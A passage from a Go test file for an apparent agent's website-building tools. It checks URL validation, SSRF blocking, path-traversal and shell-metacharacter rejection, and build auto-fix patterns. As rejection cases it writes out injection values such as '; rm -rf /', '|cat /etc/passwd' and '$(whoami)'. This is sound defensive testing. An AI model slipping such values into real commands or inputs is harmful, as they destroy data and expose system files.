package tools

import (
	"archive/tar"
	"bytes"
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func slogDiscard() *slog.Logger {
	return slog.New(slog.NewTextHandler(io.Discard, nil))
}

// ─── isValidHomepageURL ──────────────────────────────────────────────────

func TestIsValidHomepageURL_Valid(t *testing.T) {
	valid := []string{
		"https://8.8.8.8",
		"https://8.8.8.8/page?q=1",
		"HTTP://8.8.8.8",
	}
	for _, u := range valid {
		if !isValidHomepageURL(u) {
			t.Errorf("expected valid URL, got rejected: %q", u)
		}
	}
}

func TestIsValidHomepageURL_Rejects(t *testing.T) {
	invalid := []string{
		"",
		"ftp://example.com",
		"javascript:alert(1)",
		"http://example.com; rm -rf /",
		"http://example.com$(whoami)",
		"http://example.com`id`",
		"http://example.com|cat /etc/passwd",
		"http://example.com&bg",
		"http://example.com\nhttp://evil.com",
		"http://example.com\"injected",
		"http://example.com'injected",
		"http://example.com\\path",
		"http://example.com!",
		"/etc/passwd",
		"example.com",
	}
	for _, u := range invalid {
		if isValidHomepageURL(u) {
			t.Errorf("expected rejection, got valid for: %q", u)
		}
	}
}

// ─── SSRF Protection ─────────────────────────────────────────────────────

func TestIsValidHomepageURL_RejectsSSRF(t *testing.T) {
	ssrf := []string{
		"http://localhost:3000",
		"http://127.0.0.1:8080",
		"http://192.168.1.1:8080/path",
		"http://10.0.0.1",
		"http://172.16.0.1",
		"http://[::1]:3000",
	}
	for _, u := range ssrf {
		if isValidHomepageURL(u) {
			t.Errorf("expected SSRF rejection for private/loopback URL: %q", u)
		}
	}
}

func TestIsPrivateIP(t *testing.T) {
	tests := []struct {
		ip      string
		private bool
	}{
		{"127.0.0.1", true},
		{"10.0.0.1", true},
		{"172.16.0.1", true},
		{"192.168.1.1", true},
		{"::1", true},
		{"8.8.8.8", false},
		{"1.1.1.1", false},
	}
	for _, tc := range tests {
		ip := net.ParseIP(tc.ip)
		if ip == nil {
			t.Fatalf("failed to parse IP %q", tc.ip)
		}
		got := isPrivateIP(ip)
		if got != tc.private {
			t.Errorf("isPrivateIP(%q) = %v, want %v", tc.ip, got, tc.private)
		}
	}
}

// ─── sanitizeProjectDir ──────────────────────────────────────────────────

func TestSanitizeProjectDir_Valid(t *testing.T) {
	valid := []string{
		"my-site",
		"project123",
		"my_portfolio",
		"site-v2.0",
		"sub/dir",
	}
	for _, d := range valid {
		if err := sanitizeProjectDir(d); err != nil {
			t.Errorf("expected valid dir %q, got error: %v", d, err)
		}
	}
}

func TestSanitizeProjectDir_PathTraversal(t *testing.T) {
	traversal := []string{
		"..",
		"../etc",
		"foo/../bar",
		"foo/../../etc/passwd",
	}
	for _, d := range traversal {
		err := sanitizeProjectDir(d)
		if err == nil {
			t.Errorf("expected path traversal rejection for %q", d)
		}
		if err != nil && !strings.Contains(err.Error(), "path traversal") {
			t.Errorf("expected path traversal error for %q, got: %v", d, err)
		}
	}
}

func TestSanitizeProjectDir_AbsolutePaths(t *testing.T) {
	abs := []string{"/etc/passwd", "\\windows\\system32"}
	for _, d := range abs {
		err := sanitizeProjectDir(d)
		if err == nil {
			t.Errorf("expected absolute path rejection for %q", d)
		}
		if err != nil && !strings.Contains(err.Error(), "absolute paths") {
			t.Errorf("expected absolute paths error for %q, got: %v", d, err)
		}
	}
}

func TestSanitizeProjectDir_AbsolutePathGuidance(t *testing.T) {
	err := sanitizeProjectDir("/workspace/ki-news")
	if err == nil {
		t.Fatal("expected absolute path to be rejected")
	}
	if !strings.Contains(err.Error(), "project_dir must be relative") {
		t.Fatalf("expected relative project_dir guidance, got: %v", err)
	}
}

func TestNormalizeHomepageProjectIdentityRequiresProjectDir(t *testing.T) {
	_, err := NormalizeHomepageProjectIdentity("", false)
	if err == nil || !strings.Contains(err.Error(), "project_dir is required") {
		t.Fatalf("expected project_dir required error, got %v", err)
	}
}

func TestNormalizeHomepageProjectIdentityRequiresNonWhitespaceProjectDir(t *testing.T) {
	_, err := NormalizeHomepageProjectIdentity("   ", false)
	if err == nil || !strings.Contains(err.Error(), "project_dir is required") {
		t.Fatalf("expected project_dir required error, got %v", err)
	}
}

func TestNormalizeHomepageProjectIdentityRejectsAmbiguousRoot(t *testing.T) {
	_, err := NormalizeHomepageProjectIdentity(".", false)
	if err == nil || !strings.Contains(err.Error(), "ambiguous") {
		t.Fatalf("expected ambiguous root error, got %v", err)
	}
}

func TestNormalizeHomepageProjectIdentityAllowsRootWhenRequested(t *testing.T) {
	got, err := NormalizeHomepageProjectIdentity(".", true)
	if err != nil {
		t.Fatalf("NormalizeHomepageProjectIdentity failed: %v", err)
	}
	if got != "." {
		t.Fatalf("normalized project_dir = %q, want .", got)
	}
}

func TestNormalizeHomepageProjectIdentityNormalizesSafeRelativePath(t *testing.T) {
	got, err := NormalizeHomepageProjectIdentity("sites/site-a/", false)
	if err != nil {
		t.Fatalf("NormalizeHomepageProjectIdentity failed: %v", err)
	}
	if got != "sites/site-a" {
		t.Fatalf("normalized project_dir = %q, want sites/site-a", got)
	}
}

func TestNormalizeHomepageProjectIdentityRejectsTraversal(t *testing.T) {
	_, err := NormalizeHomepageProjectIdentity("sites/../site-a", false)
	if err == nil || !strings.Contains(err.Error(), "path traversal") {
		t.Fatalf("expected path traversal error, got %v", err)
	}
}

func TestNormalizeHomepageProjectIdentityRejectsAbsolutePath(t *testing.T) {
	_, err := NormalizeHomepageProjectIdentity("/workspace/site-a", false)
	if err == nil || !strings.Contains(err.Error(), "relative to the homepage workspace") {
		t.Fatalf("expected absolute path error, got %v", err)
	}
}

func TestNormalizeHomepageProjectIdentityRejectsWindowsDriveAbsolutePath(t *testing.T) {
	_, err := NormalizeHomepageProjectIdentity("C:/Users/Andi/site", false)
	if err == nil || !strings.Contains(err.Error(), "relative to the homepage workspace") {
		t.Fatalf("expected absolute path error, got %v", err)
	}
}

func TestValidateHomepageRelativePathArgGuidance(t *testing.T) {
	err := validateHomepageRelativePathArg("/workspace/ki-news/src/app/page.tsx", "path")
	if err == nil {
		t.Fatal("expected absolute homepage path to be rejected")
	}
	if !strings.Contains(err.Error(), "must be relative to the homepage workspace") {
		t.Fatalf("expected relative workspace guidance, got: %v", err)
	}
}

func TestValidateHomepageSourceEditPathRejectsGeneratedOutput(t *testing.T) {
	for _, path := range []string{
		"ki-news-new/dist/index.html",
		"ki-news-new/build/index.html",
		"ki-news-new/out/index.html",
		"site/dist/x",
		"dist/x",
	} {
		if err := validateHomepageSourceEditPath(path); err == nil {
			t.Fatalf("expected generated output path %q to be rejected", path)
		}
	}
}

func TestValidateHomepageSourceEditPathAllowsSourceBuildFolder(t *testing.T) {
	if err := validateHomepageSourceEditPath("ki-news-new/src/build/helpers.ts"); err != nil {
		t.Fatalf("expected source build helper path to be allowed, got: %v", err)
	}
}

func TestHomepageWorkspacePathNotConfiguredJSONIncludesGuidance(t *testing.T) {
	result := homepageWorkspacePathNotConfiguredJSON()
	if !strings.Contains(result, "workspace_path not configured") {
		t.Fatalf("expected workspace_path guidance error, got: %s", result)
	}
	if !strings.Contains(result, "project_dir/path values") {
		t.Fatalf("expected detailed workspace guidance, got: %s", result)
	}
}

func TestSanitizeProjectDir_ShellMetachars(t *testing.T) {
	shellInjections := []string{
		"foo;bar",
		"foo|bar",
		"foo&bar",
		"foo`id`",
		"foo$(whoami)",
		"foo{a,b}",
		"foo>out",
		"foo<in",
		"foo'bar",
		"foo\"bar",
		"foo!bar",
		"foo bar",
		"foo\nbar",
	}
	for _, d := range shellInjections {
		err := sanitizeProjectDir(d)
		if err == nil {
			t.Errorf("expected shell metachar rejection for %q", d)
		}
		if err != nil && !strings.Contains(err.Error(), "invalid character") {
			t.Errorf("expected invalid character error for %q, got: %v", d, err)
		}
	}
}

func TestValidateHomepageProjectNameRejectsControlCharacters(t *testing.T) {
	for _, name := range []string{"foo\ncurl-evil", "foo\rbar", "foo\tbar"} {
		if err := validateHomepageProjectName(name); err == nil {
			t.Fatalf("expected project name %q to be rejected", name)
		}
	}
}

// ─── truncateStr ─────────────────────────────────────────────────────────

func TestTruncateStr(t *testing.T) {
	tests := []struct {
		s      string
		maxLen int
		want   string
	}{
		{"hello", 10, "hello"},
		{"hello", 5, "hello"},
		{"hello world", 5, "hello…"},
		{"", 5, ""},
		{"a", 1, "a"},
		{"ab", 1, "a…"},
	}
	for _, tc := range tests {
		got := truncateStr(tc.s, tc.maxLen)
		if got != tc.want {
			t.Errorf("truncateStr(%q, %d) = %q, want %q", tc.s, tc.maxLen, got, tc.want)
		}
	}
}

// ─── extractOutput ───────────────────────────────────────────────────────

func TestExtractOutput(t *testing.T) {
	// Valid JSON with output field
	got := extractOutput(`{"output":"hello","status":"ok"}`)
	if got != "hello" {
		t.Errorf("expected 'hello', got %q", got)
	}

	// No output field — returns original
	got = extractOutput(`{"status":"ok"}`)
	if got != `{"status":"ok"}` {
		t.Errorf("expected original JSON, got %q", got)
	}

	// Not JSON — returns original
	got = extractOutput("plain text")
	if got != "plain text" {
		t.Errorf("expected 'plain text', got %q", got)
	}
}

func TestHomepageBuildCopiesReferencedGeneratedAssets(t *testing.T) {
	dir := t.TempDir()
	workspace := filepath.Join(dir, "workspace")
	dataDir := filepath.Join(dir, "data")
	projectRoot := filepath.Join(workspace, "ki-news")
	buildDir := filepath.Join(projectRoot, "dist")
	imageName := "img_20260622_ki_news.webp"

	for _, path := range []string{
		filepath.Join(projectRoot, "node_modules"),
		filepath.Join(buildDir, "assets"),
		filepath.Join(dataDir, "generated_images"),
	} {
		if err := os.MkdirAll(path, 0o755); err != nil {
			t.Fatalf("mkdir %s: %v", path, err)
		}
	}
	if err := os.WriteFile(filepath.Join(projectRoot, "package.json"), []byte(`{"scripts":{"build":"vite"}}`), 0o644); err != nil {
		t.Fatalf("write package.json: %v", err)
	}
	if err := os.WriteFile(filepath.Join(buildDir, "index.html"), []byte(`<div id="root"></div><script src="/assets/main.js"></script>`), 0o644); err != nil {
		t.Fatalf("write index.html: %v", err)
	}
	if err := os.WriteFile(filepath.Join(buildDir, "assets", "main.js"), []byte(`const hero="/files/generated_images/`+imageName+`";`), 0o644); err != nil {
		t.Fatalf("write bundle: %v", err)
	}
	if err := os.WriteFile(filepath.Join(dataDir, "generated_images", imageName), []byte("webp-bytes"), 0o644); err != nil {
		t.Fatalf("write generated image: %v", err)
	}

	oldExec := homepageDockerExecFunc
	oldInternal := homepageDockerExecInternalFunc
	defer func() {
		homepageDockerExecFunc = oldExec
		homepageDockerExecInternalFunc = oldInternal
	}()
	homepageDockerExecInternalFunc = func(cfg DockerConfig, containerName, command, user string, env []string) string {
		return `{"status":"ok","exit_code":0,"output":""}`
	}
	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
		if strings.Contains(command, "command -v node") && strings.Contains(command, "command -v npm") {
			return `{"status":"ok","exit_code":0,"output":"/usr/local/bin/node\n/usr/local/bin/npm"}`
		}
		if !strings.Contains(command, "npm run build") {
			t.Fatalf("unexpected docker exec command: %s", command)
		}
		return `{"status":"ok","exit_code":0,"output":"built"}`
	}

	result := HomepageBuild(HomepageConfig{WorkspacePath: workspace, DataDir: dataDir}, "ki-news", slogDiscard())
	var parsed map[string]interface{}
	if err := json.Unmarshal([]byte(result), &parsed); err != nil {
		t.Fatalf("build result is not JSON: %s", result)
	}
	if parsed["status"] != "ok" {
		t.Fatalf("build failed: %s", result)
	}
	copied, err := os.ReadFile(filepath.Join(buildDir, "files", "generated_images", imageName))
	if err != nil {
		t.Fatalf("expected build to copy generated image into dist: %v", err)
	}
	if string(copied) != "webp-bytes" {
		t.Fatalf("copied generated image = %q, want webp-bytes", string(copied))
	}
}

func TestHomepageBuildMissingNpmGuidesContainerRebuild(t *testing.T) {
	dir := t.TempDir()
	workspace := filepath.Join(dir, "workspace")
	projectRoot := filepath.Join(workspace, "ki-news")
	if err := os.MkdirAll(filepath.Join(projectRoot, "node_modules"), 0o755); err != nil {
		t.Fatalf("mkdir node_modules: %v", err)
	}
	if err := os.WriteFile(filepath.Join(projectRoot, "package.json"), []byte(`{"scripts":{"build":"vite"}}`), 0o644); err != nil {
		t.Fatalf("write package.json: %v", err)
	}

	oldExec := homepageDockerExecFunc
	oldInternal := homepageDockerExecInternalFunc
	oldRebuild := homepageRuntimeRebuildFunc
	defer func() {
		homepageDockerExecFunc = oldExec
		homepageDockerExecInternalFunc = oldInternal
		homepageRuntimeRebuildFunc = oldRebuild
	}()
	homepageDockerExecInternalFunc = func(cfg DockerConfig, containerName, command, user string, env []string) string {
		return `{"status":"ok","exit_code":0,"output":""}`
	}
	homepageRuntimeRebuildFunc = func(cfg HomepageConfig, logger *slog.Logger) string {
		return `{"status":"error","message":"docker image rebuild failed"}`
	}
	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
		return `{"status":"error","exit_code":127,"output":"/bin/sh: 1: npm: not found"}`
	}

	result := HomepageBuild(HomepageConfig{WorkspacePath: workspace}, "ki-news", slogDiscard())
	if !strings.Contains(strings.ToLower(result), "homepage rebuild") {
		t.Fatalf("expected npm-missing result to guide homepage rebuild, got: %s", result)
	}
	if strings.Contains(strings.ToLower(result), "curl -fssl https://deb.nodesource.com") {
		t.Fatalf("expected container rebuild guidance, not host Node install commands: %s", result)
	}
}

func TestHomepageBuildSelfHealsMissingNodeRuntimeOnce(t *testing.T) {
	dir := t.TempDir()
	workspace := filepath.Join(dir, "workspace")
	projectRoot := filepath.Join(workspace, "ki-news")
	buildDir := filepath.Join(projectRoot, "dist")
	if err := os.MkdirAll(filepath.Join(projectRoot, "node_modules"), 0o755); err != nil {
		t.Fatalf("mkdir node_modules: %v", err)
	}
	if err := os.WriteFile(filepath.Join(projectRoot, "package.json"), []byte(`{"scripts":{"build":"vite"}}`), 0o644); err != nil {
		t.Fatalf("write package.json: %v", err)
	}

	oldExec := homepageDockerExecFunc
	oldInternal := homepageDockerExecInternalFunc
	oldRebuild := homepageRuntimeRebuildFunc
	defer func() {
		homepageDockerExecFunc = oldExec
		homepageDockerExecInternalFunc = oldInternal
		homepageRuntimeRebuildFunc = oldRebuild
	}()

	precheckCalls := 0
	rebuildCalls := 0
	buildCalls := 0
	homepageDockerExecInternalFunc = func(cfg DockerConfig, containerName, command, user string, env []string) string {
		return `{"status":"ok","exit_code":0,"output":""}`
	}
	homepageRuntimeRebuildFunc = func(cfg HomepageConfig, logger *slog.Logger) string {
		rebuildCalls++
		return `{"status":"ok","message":"rebuilt"}`
	}
	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
		switch {
		case strings.Contains(command, "command -v node") && strings.Contains(command, "command -v npm"):
			precheckCalls++
			if precheckCalls == 1 {
				return `{"status":"error","exit_code":127,"output":"/bin/sh: 1: node: not found"}`
			}
			return `{"status":"ok","exit_code":0,"output":"/usr/local/bin/node\n/usr/local/bin/npm"}`
		case strings.Contains(command, "npm run build"):
			buildCalls++
			if err := os.MkdirAll(buildDir, 0o755); err != nil {
				t.Fatalf("mkdir dist: %v", err)
			}
			if err := os.WriteFile(filepath.Join(buildDir, "index.html"), []byte(`<div id="root"></div>`), 0o644); err != nil {
				t.Fatalf("write dist index: %v", err)
			}
			return `{"status":"ok","exit_code":0,"output":"built"}`
		default:
			return `{"status":"ok","exit_code":0,"output":""}`
		}
	}

	result := HomepageBuild(HomepageConfig{WorkspacePath: workspace}, "ki-news", slogDiscard())
	if !strings.Contains(result, `"status":"ok"`) {
		t.Fatalf("expected build to recover and succeed, got: %s", result)
	}
	if precheckCalls != 2 {
		t.Fatalf("runtime precheck calls = %d, want 2", precheckCalls)
	}
	if rebuildCalls != 1 {
		t.Fatalf("runtime rebuild calls = %d, want 1", rebuildCalls)
	}
	if buildCalls != 1 {
		t.Fatalf("build calls = %d, want 1", buildCalls)
	}
}

func TestHomepageBuildRejectsSuccessWithoutDeployableIndex(t *testing.T) {
	dir := t.TempDir()
	workspace := filepath.Join(dir, "workspace")
	projectRoot := filepath.Join(workspace, "ki-news")
	if err := os.MkdirAll(filepath.Join(projectRoot, "node_modules"), 0o755); err != nil {
		t.Fatalf("mkdir node_modules: %v", err)
	}
	if err := os.WriteFile(filepath.Join(projectRoot, "package.json"), []byte(`{"scripts":{"build":"vite"}}`), 0o644); err != nil {
		t.Fatalf("write package.json: %v", err)
	}

	oldExec := homepageDockerExecFunc
	oldInternal := homepageDockerExecInternalFunc
	defer func() {
		homepageDockerExecFunc = oldExec
		homepageDockerExecInternalFunc = oldInternal
	}()
	homepageDockerExecInternalFunc = func(cfg DockerConfig, containerName, command, user string, env []string) string {
		return `{"status":"ok","exit_code":0,"output":""}`
	}
	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
		if strings.Contains(command, "command -v node") {
			return `{"status":"ok","exit_code":0,"output":"/usr/local/bin/node\n/usr/local/bin/npm"}`
		}
		if strings.Contains(command, "npm run build") {
			return `{"status":"ok","exit_code":0,"output":"built without static output"}`
		}
		return `{"status":"ok","exit_code":0,"output":""}`
	}

	result := HomepageBuild(HomepageConfig{WorkspacePath: workspace}, "ki-news", slogDiscard())
	if !strings.Contains(result, `"status":"error"`) {
		t.Fatalf("expected missing deployable index to fail, got: %s", result)
	}
	if !strings.Contains(result, "index.html") {
		t.Fatalf("expected index.html guidance, got: %s", result)
	}
}

func TestHomepageBuildRejectsDeployableIndexOlderThanCurrentBuild(t *testing.T) {
	dir := t.TempDir()
	workspace := filepath.Join(dir, "workspace")
	projectRoot := filepath.Join(workspace, "ki-news")
	buildDir := filepath.Join(projectRoot, "dist")
	if err := os.MkdirAll(filepath.Join(projectRoot, "node_modules"), 0o755); err != nil {
		t.Fatalf("mkdir node_modules: %v", err)
	}
	if err := os.MkdirAll(buildDir, 0o755); err != nil {
		t.Fatalf("mkdir dist: %v", err)
	}
	if err := os.WriteFile(filepath.Join(projectRoot, "package.json"), []byte(`{"scripts":{"build":"vite"}}`), 0o644); err != nil {
		t.Fatalf("write package.json: %v", err)
	}
	indexPath := filepath.Join(buildDir, "index.html")
	if err := os.WriteFile(indexPath, []byte(`<div id="old-root"></div>`), 0o644); err != nil {
		t.Fatalf("write stale index: %v", err)
	}
	staleTime := time.Now().Add(-2 * time.Hour)
	if err := os.Chtimes(indexPath, staleTime, staleTime); err != nil {
		t.Fatalf("set stale index mtime: %v", err)
	}

	oldExec := homepageDockerExecFunc
	oldInternal := homepageDockerExecInternalFunc
	defer func() {
		homepageDockerExecFunc = oldExec
		homepageDockerExecInternalFunc = oldInternal
	}()
	homepageDockerExecInternalFunc = func(cfg DockerConfig, containerName, command, user string, env []string) string {
		return `{"status":"ok","exit_code":0,"output":""}`
	}
	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
		if strings.Contains(command, "command -v node") {
			return `{"status":"ok","exit_code":0,"output":"/usr/local/bin/node\n/usr/local/bin/npm"}`
		}
		if strings.Contains(command, "npm run build") {
			return `{"status":"ok","exit_code":0,"output":"build succeeded but did not update dist"}`
		}
		return `{"status":"ok","exit_code":0,"output":""}`
	}

	result := HomepageBuild(HomepageConfig{WorkspacePath: workspace}, "ki-news", slogDiscard())
	if !strings.Contains(result, `"status":"error"`) {
		t.Fatalf("expected stale deployable output to fail, got: %s", result)
	}
	if !strings.Contains(result, "stale") {
		t.Fatalf("expected stale output guidance, got: %s", result)
	}
}

func TestHomepageInstallDepsSelfHealsMissingNodeRuntimeBeforeNpm(t *testing.T) {
	oldExec := homepageDockerExecFunc
	oldInternal := homepageDockerExecInternalFunc
	oldRebuild := homepageRuntimeRebuildFunc
	defer func() {
		homepageDockerExecFunc = oldExec
		homepageDockerExecInternalFunc = oldInternal
		homepageRuntimeRebuildFunc = oldRebuild
	}()

	precheckCalls := 0
	rebuildCalls := 0
	installCalls := 0
	homepageDockerExecInternalFunc = func(cfg DockerConfig, containerName, command, user string, env []string) string {
		return `{"status":"ok","exit_code":0,"output":""}`
	}
	homepageRuntimeRebuildFunc = func(cfg HomepageConfig, logger *slog.Logger) string {
		rebuildCalls++
		return `{"status":"ok","message":"rebuilt"}`
	}
	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
		switch {
		case strings.Contains(command, "command -v node") && strings.Contains(command, "command -v npm"):
			precheckCalls++
			if precheckCalls == 1 {
				return `{"status":"error","exit_code":127,"output":"npm: command not found"}`
			}
			return `{"status":"ok","exit_code":0,"output":"/usr/local/bin/node\n/usr/local/bin/npm"}`
		case strings.Contains(command, "test -d /workspace/ki-news"):
			return `{"status":"ok","exit_code":0,"output":"EXISTS"}`
		case strings.Contains(command, "npm install"):
			installCalls++
			return `{"status":"ok","exit_code":0,"output":"installed"}`
		default:
			return `{"status":"ok","exit_code":0,"output":""}`
		}
	}

	result := HomepageInstallDeps(HomepageConfig{WorkspacePath: t.TempDir()}, "ki-news", nil, slogDiscard())
	if !strings.Contains(result, `"status":"ok"`) {
		t.Fatalf("expected install to recover and succeed, got: %s", result)
	}
	if precheckCalls != 2 {
		t.Fatalf("runtime precheck calls = %d, want 2", precheckCalls)
	}
	if rebuildCalls != 1 {
		t.Fatalf("runtime rebuild calls = %d, want 1", rebuildCalls)
	}
	if installCalls != 1 {
		t.Fatalf("npm install calls = %d, want 1", installCalls)
	}
}

func TestShellSingleQuoteEscapesSingleQuotes(t *testing.T) {
	got := shellSingleQuote("/var/www/it's-here")
	want := `'/var/www/it'"'"'s-here'`
	if got != want {
		t.Fatalf("shellSingleQuote = %q, want %q", got, want)
	}
}

func TestHomepageScreenshotFallsBackToWebCaptureWhenPlaywrightIsMissing(t *testing.T) {
	oldDockerExec := homepageDockerExecFunc
	oldWebCapture := homepageWebCaptureFunc
	defer func() {
		homepageDockerExecFunc = oldDockerExec
		homepageWebCaptureFunc = oldWebCapture
	}()

	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
		return `{"container_id":"aurago-homepage","exit_code":1,"output":"Error: Cannot find module 'playwright'"}`
	}
	homepageWebCaptureFunc = func(ctx context.Context, operation, rawURL, selector string, fullPage bool, outputDir string) string {
		if operation != "screenshot" {
			t.Fatalf("operation = %q, want screenshot", operation)
		}
		if rawURL != "https://8.8.8.8" {
			t.Fatalf("url = %q, want https://8.8.8.8", rawURL)
		}
		return `{"status":"success","operation":"screenshot","file":"agent_workspace/workdir/fallback.png"}`
	}

	got := HomepageScreenshot(context.Background(), HomepageConfig{}, "https://8.8.8.8", "", nil)
	if !strings.Contains(got, `"status":"success"`) {
		t.Fatalf("expected web_capture fallback result, got: %s", got)
	}
	if !strings.Contains(got, "fallback.png") {
		t.Fatalf("expected fallback screenshot path, got: %s", got)
	}
}

// ─── Build Auto-Fix Pattern Matching ─────────────────────────────────────

func TestBuildFixPatterns_MissingNpmModule(t *testing.T) {
	output := `Error: Cannot find module 'react-router-dom'`
	for _, p := range buildFixPatterns {
		if p.name != "missing-npm-module" {
			continue
		}
		m := p.pattern.FindStringSubmatch(output)
		if m == nil {
			t.Fatal("expected missing-npm-module pattern to match")
		}
		fix := p.fix(m, "my-site")
		if !strings.Contains(fix, "npm install 'react-router-dom'") {
			t.Errorf("expected fix to contain the quoted 'npm install react-router-dom', got: %s", fix)
		}
	}
}

func TestBuildFixPatterns_MissingNpmModuleSubpath(t *testing.T) {
	output := `Error: Cannot find module 'lodash/debounce'`
	for _, p := range buildFixPatterns {
		if p.name != "missing-npm-module" {
			continue
		}
		m := p.pattern.FindStringSubmatch(output)
		if m == nil {
			t.Fatal("expected pattern to match")
		}
		fix := p.fix(m, "site")
		// Should install just 'lodash', not 'lodash/debounce'
		if !strings.Contains(fix, "npm install 'lodash'") {
			t.Errorf("expected fix to install 'lodash', got: %s", fix)
		}
		if strings.Contains(fix, "lodash/debounce") {
			t.Errorf("should strip subpath, got: %s", fix)
		}
	}
}

func TestBuildFixPatterns_ScopedPackage(t *testing.T) {
	output := `Error: Cannot find module '@emotion/react/jsx-runtime'`
	for _, p := range buildFixPatterns {
		if p.name != "missing-npm-module" {
			continue
		}
		m := p.pattern.FindStringSubmatch(output)
		if m == nil {
			t.Fatal("expected pattern to match")
		}
		fix := p.fix(m, "site")
		if !strings.Contains(fix, "npm install '@emotion/react'") {
			t.Errorf("expected scoped package install, got: %s", fix)
		}
	}
}

func TestBuildFixPatterns_WebpackModuleNotFound(t *testing.T) {
	output := `Module not found: Error: Can't resolve 'axios' in '/workspace/site/src'`
	for _, p := range buildFixPatterns {
		if p.name != "module-not-found-webpack" {
			continue
		}
		m := p.pattern.FindStringSubmatch(output)
		if m == nil {
			t.Fatal("expected module-not-found-webpack pattern to match")
		}
		fix := p.fix(m, "site")
		if !strings.Contains(fix, "npm install 'axios'") {
			t.Errorf("expected fix to install 'axios', got: %s", fix)
		}
	}
}

func TestBuildFixPatterns_WebpackRelativePath(t *testing.T) {
	output := `Module not found: Error: Can't resolve './components/Header' in '/workspace/site/src'`
	for _, p := range buildFixPatterns {
		if p.name != "module-not-found-webpack" {
			continue
		}
		m := p.pattern.FindStringSubmatch(output)
		if m == nil {
			t.Fatal("expected pattern to match")
		}
		fix := p.fix(m, "site")
		// Relative paths should not produce a fix
		if fix != "" {
			t.Errorf("relative path should not produce fix, got: %s", fix)
		}
	}
}

func TestBuildFixPatterns_EslintFixable(t *testing.T) {
	output := `12 errors and 5 warnings potentially fixable with the --fix option.`
	for _, p := range buildFixPatterns {
		if p.name != "eslint-fixable" {
			continue
		}
		m := p.pattern.FindStringSubmatch(output)
		if m == nil {
			t.Fatal("expected eslint-fixable pattern to match")
		}
		fix := p.fix(m, "my-site")
		if !strings.Contains(fix, "eslint . --fix") {
			t.Errorf("expected eslint fix, got: %s", fix)
		}
	}
}

func TestBuildFixPatterns_NpmInstallNeeded(t *testing.T) {
	output := `npm ERR! missing: webpack@^5.0.0, required by my-site@1.0.0`
	for _, p := range buildFixPatterns {
		if p.name != "npm-install-needed" {
			continue
		}
		m := p.pattern.FindStringSubmatch(output)
		if m == nil {
			t.Fatal("expected npm-install-needed pattern to match")
		}
		fix := p.fix(m, "site")
		if !strings.Contains(fix, "npm install") {
			t.Errorf("expected npm install, got: %s", fix)
		}
	}
}

func TestBuildFixPatterns_NodeModulesMissing(t *testing.T) {
	output := `Error: Cannot find module '/workspace/site/node_modules/react/index.js'`
	for _, p := range buildFixPatterns {
		if p.name != "node-modules-missing" {
			continue
		}
		m := p.pattern.FindStringSubmatch(output)
		if m == nil {
			t.Fatal("expected node-modules-missing pattern to match")
		}
		fix := p.fix(m, "site")
		if !strings.Contains(fix, "npm install") {
			t.Errorf("expected npm install, got: %s", fix)
		}
	}
}

func TestBuildFixPatterns_NoMatch(t *testing.T) {
	output := `SyntaxError: Unexpected token in JSON at position 0`
	for _, p := range buildFixPatterns {
		m := p.pattern.FindStringSubmatch(output)
		if m != nil {
			t.Errorf("pattern %q should NOT match syntax error output", p.name)
		}
	}
}

// ─── Template System ─────────────────────────────────────────────────────

func TestGetTemplateFiles_KnownTemplates(t *testing.T) {
	templates := []string{"portfolio", "blog", "landing", "dashboard"}
	for _, name := range templates {
		files := getTemplateFiles(name, "test-project")
		if len(files) == 0 {
			t.Errorf("template %q returned no files", name)
		}
		// All templates should have a CSS file and a TEMPLATE_README.md
		hasCss := false
		hasReadme := false
		for _, f := range files {
			if strings.HasSuffix(f.path, ".css") {
				hasCss = true
			}
			if f.path == "TEMPLATE_README.md" {
				hasReadme = true
			}
		}
		if !hasCss {
			t.Errorf("template %q has no CSS file", name)
		}
		if !hasReadme {
			t.Errorf("template %q has no TEMPLATE_README.md", name)
		}
	}
}

func TestGetTemplateFiles_CaseInsensitive(t *testing.T) {
	files := getTemplateFiles("PORTFOLIO", "test")
	if len(files) == 0 {
		t.Error("expected PORTFOLIO (uppercase) to resolve to template files")
	}
	files = getTemplateFiles("Blog", "test")
	if len(files) == 0 {
		t.Error("expected Blog (mixed case) to resolve to template files")
	}
}

func TestGetTemplateFiles_Unknown(t *testing.T) {
	files := getTemplateFiles("nonexistent", "test")
	if len(files) != 0 {
		t.Errorf("expected no files for unknown template, got %d", len(files))
	}
}

func TestGetTemplateFiles_Empty(t *testing.T) {
	files := getTemplateFiles("", "test")
	if len(files) != 0 {
		t.Errorf("expected no files for empty template, got %d", len(files))
	}
}

// ─── getLocalLANIP ───────────────────────────────────────────────────────

func TestGetLocalLANIP_Format(t *testing.T) {
	ip := getLocalLANIP()
	// May return empty if CI has no real interfaces; that's acceptable.
	if ip == "" {
		t.Log("getLocalLANIP returned empty (no non-loopback interface) — OK in CI")
		return
	}
	// Must not be loopback
	if ip == "127.0.0.1" || ip == "::1" {
		t.Errorf("getLocalLANIP should not return loopback, got %q", ip)
	}
	// Should look like an IPv4 address
	if strings.Count(ip, ".") != 3 {
		t.Errorf("expected IPv4 format, got %q", ip)
	}
}

// ─── Viewport Validation ─────────────────────────────────────────────────

func TestHomepageScreenshot_ViewportInjection(t *testing.T) {
	oldDockerExec := homepageDockerExecFunc
	defer func() { homepageDockerExecFunc = oldDockerExec }()

	homepageDockerExecFunc = func(cfg DockerConfig, containerName, command, user string) string {
		return `{"status":"ok"}`
	}

	// Injection attempt: should be rejected
	malicious := []string{
		"1280x720;rm -rf /",
		"1280x$(whoami)",
		"abc x def",
		"-1x720",
		"0x0",
		"99999x99999",
		"1280",
	}
	for _, v := range malicious {
		got := HomepageScreenshot(context.Background(), HomepageConfig{}, "https://example.com", v, nil)
		if !strings.Contains(got, "error") && !strings.Contains(got, "invalid viewport") {
			t.Errorf("expected viewport rejection for %q, got: %s", v, got)
		}
	}

	// Valid viewports should pass (not return error)
	valid := []string{"1280x720", "1920x1080", "320x480"}
	for _, v := range valid {
		got := HomepageScreenshot(context.Background(), HomepageConfig{}, "https://8.8.8.8", v, nil)
